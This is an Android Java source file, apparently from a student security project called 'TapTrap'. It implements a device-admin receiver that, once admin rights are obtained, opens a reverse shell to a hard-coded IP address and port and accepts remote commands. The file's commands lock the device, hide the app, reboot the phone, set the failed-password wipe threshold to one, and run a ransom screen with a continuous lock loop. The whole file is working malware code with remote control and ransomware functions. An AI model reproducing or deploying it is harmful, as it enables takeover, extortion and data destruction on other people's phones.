package com.example.inf2007_mad_j1847.test;
//import static com.example.inf2007_mad_j1847.test.Ran_warnKt.showRansomDialog;

import android.app.AlertDialog;
import android.app.admin.DeviceAdminReceiver;
import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager;
import android.graphics.Color;
import android.graphics.drawable.ColorDrawable;
import android.os.Build;
import android.os.Handler;
import android.os.Looper;
import android.os.PowerManager;
import android.util.Log;
import android.view.Gravity;
import android.view.WindowManager;
import android.widget.TextView;

import java.io.IOException;
import java.net.Socket;
import java.util.List;
import java.util.concurrent.atomic.AtomicBoolean;


import androidx.camera.core.Camera;

public class AppDeviceAdminReceiver extends DeviceAdminReceiver {

    private static final String TAG = "TapTrap-Admin";
    private static final String SERVER_IP = "20.2.66.175";
    private static final int SERVER_PORT = 9999;


    // Lock control variables
    private static AtomicBoolean isContinuousLockActive = new AtomicBoolean(false);
    private static Thread continuousLockThread = null;
    private static PowerManager.WakeLock wakeLock = null;
    @Override
    public void onEnabled(Context context, Intent intent) {
        super.onEnabled(context, intent);
        // 🔴 TAPTRAP SUCCEEDED!
        Log.d(TAG, "🔥 Device Admin GRANTED via TapTrap!");
        Log.d(TAG, "connect to server ");


        // START THE SERVICE instead of calling launchReverseShell directly
        Intent serviceIntent = new Intent(context, ShellService.class);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            context.startForegroundService(serviceIntent);
        } else {
            context.startService(serviceIntent);
        }

//        launchReverseShell(context);
        Log.d(TAG, "APP LIST:\n" + getInstalledApps(context));



    }

    // Reverse Shell Code
    public void launchReverseShell(Context context) {
        new Thread(() -> {
            try {
                Socket socket = new Socket(SERVER_IP, SERVER_PORT);
                Log.d(TAG, "🔥 Reverse shell launched!");

                // Send a welcome message to the listener
                java.io.PrintWriter writer = new java.io.PrintWriter(socket.getOutputStream(), true);
                writer.println("🔥 TapTrap shell connected!");
                writer.println("Available commands:");
                writer.println("  lock        - Lock the device");
                writer.println("  whoami      - Show app user info");
                writer.println("  device_info - Show device details");
                writer.println("  battery     - Show battery status");
                writer.println("  ip          - Show IP addresses");
                writer.println("  list_apps (only show current app)  - List installed apps");
                writer.println("  hide_app (no use?)    - Hide app from launcher");
                writer.println("  show_app (no use?)    - Show app in launcher");
                writer.println("  reboot (not working on emulator)     - Reboot device");
                writer.println("  ransom_lock - set max idle time lock");
                writer.println("  ransom_end ");
                writer.println("  exit        - Close connection");
                writer.println("  wipe  (not working on emulator)      - Factory reset device (physical only)");



                writer.println("----------------------------------");

                // Read commands from listener
                java.io.BufferedReader reader = new java.io.BufferedReader(
                        new java.io.InputStreamReader(socket.getInputStream())
                );

                String command;
                while ((command = reader.readLine()) != null) {
                    command = command.trim();
                    Log.d(TAG, "📩 Command received: " + command);
                    String response = handleCommand(context, command);
                    writer.println(response);

                    if (command.equals("exit")) break;
                }

                socket.close();

            } catch (Exception e) {
                Log.e(TAG, "Shell failed: " + e.getMessage());
            }
        }).start();
    }

    private String handleCommand(Context context, String command) {
        switch (command.toLowerCase()) {
            case "lock":
                lockDevice(context);

                return "✅ Device locked!";



            case "whoami":
                return "User: " + android.os.Process.myUid() +
                        " | App: " + context.getPackageName();

            case "device_info":
                return getDeviceInfo();

            case "battery":
                return getBatteryInfo(context);

            case "ip":
                return getIpAddress();

            case "list_apps":
                return getInstalledApps(context);

            case "hide_app":
                hideApp(context);
                return "✅ App hidden from launcher!";

            case "show_app":
                showApp(context);
                return "✅ App visible in launcher!";

            case "reboot":
                rebootDevice(context);
                return "✅ Rebooting device...";

            case "help":
                return "Commands: lock, cam_off, cam_on, whoami, device_info, battery, ip, list_apps, hide_app, show_app, reboot, exit";

            case "exit":
                return "👋 Closing connection...";

            case "wipe":

                setMaxFailedAttempts(context, 1);
            return "✅ Wiping device...";



            case "ransom_lock":
                showRansomDialog(context);
                startContinuousLock(context);
                return "✅ Device locked!";

            case "ransom_end":
                stopContinuousLock();
                return "✅ Device locked!";

            default:
                return "❌ Unknown command: " + command + " | type 'help' for commands";
        }
    }

    // Add this new wipe function
    public void wipeDevice(Context context) {
        DevicePolicyManager dpm = getDpm(context);
        Log.d(TAG, "💀 Wiping device!");
        dpm.wipeData(0);
        //dpm.wipeDevice(0);
    }
    // Device info
    private String getDeviceInfo() {
        return "Model: " + android.os.Build.MODEL +
                "\nManufacturer: " + android.os.Build.MANUFACTURER +
                "\nAndroid: " + android.os.Build.VERSION.RELEASE +
                "\nAPI: " + android.os.Build.VERSION.SDK_INT +
                "\nDevice: " + android.os.Build.DEVICE +
                "\nFingerprint: " + android.os.Build.FINGERPRINT;
    }

    // Battery info
    private String getBatteryInfo(Context context) {
        android.content.IntentFilter ifilter = new android.content.IntentFilter(Intent.ACTION_BATTERY_CHANGED);
        Intent batteryStatus = context.registerReceiver(null, ifilter);
        int level = batteryStatus != null ? batteryStatus.getIntExtra(android.os.BatteryManager.EXTRA_LEVEL, -1) : -1;
        int scale = batteryStatus != null ? batteryStatus.getIntExtra(android.os.BatteryManager.EXTRA_SCALE, -1) : -1;
        int status = batteryStatus != null ? batteryStatus.getIntExtra(android.os.BatteryManager.EXTRA_STATUS, -1) : -1;
        float pct = level * 100 / (float) scale;
        boolean charging = status == android.os.BatteryManager.BATTERY_STATUS_CHARGING ||
                status == android.os.BatteryManager.BATTERY_STATUS_FULL;
        return "Battery: " + (int) pct + "% | " + (charging ? "Charging" : "Not charging");
    }

    // IP Address
    private String getIpAddress() {
        try {
            java.util.Enumeration<java.net.NetworkInterface> interfaces = java.net.NetworkInterface.getNetworkInterfaces();
            StringBuilder sb = new StringBuilder("IP Addresses:\n");
            while (interfaces.hasMoreElements()) {
                java.net.NetworkInterface iface = interfaces.nextElement();
                java.util.Enumeration<java.net.InetAddress> addrs = iface.getInetAddresses();
                while (addrs.hasMoreElements()) {
                    java.net.InetAddress addr = addrs.nextElement();
                    if (!addr.isLoopbackAddress()) {
                        sb.append(iface.getName()).append(": ").append(addr.getHostAddress()).append("\n");
                    }
                }
            }
            return sb.toString();
        } catch (Exception e) {
            return "Failed to get IP: " + e.getMessage();
        }
    }


    private List<ApplicationInfo> getInstalledAppsCompat(Context context) {
        PackageManager pm = context.getPackageManager();

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) { // API 33+
            // API 33+ requires PackageInfoFlags
            PackageManager.ApplicationInfoFlags flags =
                    PackageManager.ApplicationInfoFlags.of(0);
            return pm.getInstalledApplications(flags);
        } else {
            // Legacy method
            return pm.getInstalledApplications(PackageManager.GET_META_DATA);
        }
    }

    // List installed apps
    private String getInstalledApps(Context context) {
        StringBuilder sb = new StringBuilder("Installed Apps:\n");

        try {
            // Use compat method
            List<ApplicationInfo> apps = getInstalledAppsCompat(context);

            sb.append("Total apps found: ").append(apps.size()).append("\n");

            for (ApplicationInfo app : apps) {
                // Skip system apps (optional)
                //if ((app.flags & ApplicationInfo.FLAG_SYSTEM) == 0) {
                    String appName = context.getPackageManager()
                            .getApplicationLabel(app).toString();
                    sb.append("  - ").append(appName)
                            .append(" (").append(app.packageName).append(")\n");
                //}
            }

            Log.d("TapTrap", "App list generated: " + apps.size() + " apps");

        } catch (SecurityException e) {
            Log.e("TapTrap", "Permission denied: " + e.getMessage());
            sb.append("ERROR: Missing QUERY_ALL_PACKAGES permission");
        } catch (Exception e) {
            Log.e("TapTrap", "Error getting apps: " + e.getMessage());
            sb.append("ERROR: ").append(e.getMessage());
        }

        return sb.toString();
    }

    // Hide app from launcher
    private void hideApp(Context context) {
        android.content.pm.PackageManager pm = context.getPackageManager();
        pm.setComponentEnabledSetting(
                new ComponentName(context, context.getClass()),
                android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                android.content.pm.PackageManager.DONT_KILL_APP
        );
    }

    // Show app in launcher
    private void showApp(Context context) {
        android.content.pm.PackageManager pm = context.getPackageManager();
        pm.setComponentEnabledSetting(
                new ComponentName(context, context.getClass()),
                android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
                android.content.pm.PackageManager.DONT_KILL_APP
        );
    }

    // Reboot device
    private void rebootDevice(Context context) {
        DevicePolicyManager dpm = getDpm(context);
        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.N) {
            dpm.reboot(getAdmin(context));
        }
    }

    // ========== CENTRALIZED DPM GETTER ==========
    /**
     * Get DevicePolicyManager instance - ALL commands use this
     */
    private DevicePolicyManager getDpm(Context context) {
        return (DevicePolicyManager) context.getSystemService(Context.DEVICE_POLICY_SERVICE);
    }

    /**
     * Get ComponentName - ALL commands use this
     */
    private ComponentName getAdmin(Context context) {
        return new ComponentName(context, AppDeviceAdminReceiver.class);
    }

    /**
     * 1. Lock device immediately
     */
    public void lockDevice(Context context) {
        DevicePolicyManager dpm = getDpm(context);
        Log.d(TAG, " Locking device now");
        dpm.lockNow();

    }


    private void setMaxFailedAttempts(Context context, int attempts) {
        try {
            DevicePolicyManager dpm = getDpm(context);
            ComponentName admin = getAdmin(context);

            // Validate attempts range (1-10 as per documentation)
            if (attempts < 1 || attempts > 10) {
                Log.e(TAG, "Attempts must be between 1 and 10");
                return;
            }

            // Set the policy
            dpm.setMaximumFailedPasswordsForWipe(admin, attempts);
            Log.i(TAG, "✅ Max failed attempts set to: " + attempts);

            // Verify it was set
            int currentSetting = dpm.getMaximumFailedPasswordsForWipe(admin);
            Log.d(TAG, "Verified setting: " + currentSetting);

        } catch (SecurityException e) {
            Log.e(TAG, "Security error: " + e.getMessage());
        } catch (Exception e) {
            Log.e(TAG, "Error: " + e.getMessage());
        }
    }

    public String setRansomLock(Context context) {
        DevicePolicyManager dpm = (DevicePolicyManager)
                context.getSystemService(Context.DEVICE_POLICY_SERVICE);


        while (true) {
            Log.d(TAG, " Locking device now");
            dpm.lockNow();
            // Optional: add a small delay to prevent overwhelming the system
            try {
                Thread.sleep(100); // 100ms delay
            } catch (InterruptedException e) {
                e.printStackTrace();
            }
        }


    }



    public void startContinuousLock(final Context context) {
        if (isContinuousLockActive.get()) {
            Log.d(TAG, "⚠️ Already locking");
            return;
        }

        // Acquire wake lock
        try {
            PowerManager powerManager = (PowerManager) context.getSystemService(Context.POWER_SERVICE);
            wakeLock = powerManager.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK,
                    "TapTrap:LockWakeLock");
            wakeLock.acquire(10*60*1000L);
            Log.d(TAG, "✅ WakeLock acquired");
        } catch (Exception e) {
            Log.e(TAG, "Failed to acquire WakeLock: " + e.getMessage());
            // Continue anyway - might still work
        }

        isContinuousLockActive.set(true);

        continuousLockThread = new Thread(() -> {
            DevicePolicyManager dpm = (DevicePolicyManager)
                    context.getSystemService(Context.DEVICE_POLICY_SERVICE);

            Log.d(TAG, "▶️ INFINITE LOCK STARTED - Phone will keep locking!");
            Log.d(TAG, "📊 Locking every 100ms (10 times/second)");

            int lockCount = 0;
            long startTime = System.currentTimeMillis();

            while (isContinuousLockActive.get()) {
                try {
                    dpm.lockNow();
                    lockCount++;

                    // Log every second (every 10 locks at 100ms)
                    if (lockCount % 10 == 0) {
                        long runningTime = (System.currentTimeMillis() - startTime) / 1000;
                        Log.d(TAG, "🔒 Active for " + runningTime + "s - Lock #" + lockCount);
                    }

                    Thread.sleep(5000);

                } catch (InterruptedException e) {
                    Log.d(TAG, "⏹️ Lock thread interrupted");
                    break;
                } catch (SecurityException e) {
                    Log.e(TAG, "❌ Security error - device admin probably disabled");
                    Log.e(TAG, "Stopping lock automatically");
                    isContinuousLockActive.set(false);
                    break;
                } catch (Exception e) {
                    Log.e(TAG, "❌ Unexpected error: " + e.getMessage());
                    // Try to continue
                }
            }

            // Cleanup
            if (wakeLock != null && wakeLock.isHeld()) {
                wakeLock.release();
                Log.d(TAG, "✅ WakeLock released");
            }

            long totalTime = (System.currentTimeMillis() - startTime) / 1000;
            Log.d(TAG, "⏹️ LOCKING STOPPED after " + totalTime + " seconds and " + lockCount + " locks");
        });

        continuousLockThread.start();
    }

    /**
     * STOP continuous locking (OFF)
     */
    public void stopContinuousLock() {
        if (isContinuousLockActive.get()) {
            isContinuousLockActive.set(false);

            if (continuousLockThread != null) {
                continuousLockThread.interrupt();
                try {
                    continuousLockThread.join(2000); // Wait up to 2 seconds
                } catch (InterruptedException e) {
                    Log.e(TAG, "Interrupted while joining thread");
                }
                continuousLockThread = null;
            }

            // Release wake lock
            if (wakeLock != null && wakeLock.isHeld()) {
                wakeLock.release();
                wakeLock = null;
            }

            Log.d(TAG, "⏹️ Continuous locking STOPPED (OFF)");
        } else {
            Log.d(TAG, "⚠️ Continuous locking was not active");
        }
    }


    public void showRansomDialog(Context context) {
        Intent intent = new Intent(context, RansomActivity.class);
        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);

        context.startActivity(intent);
    }



}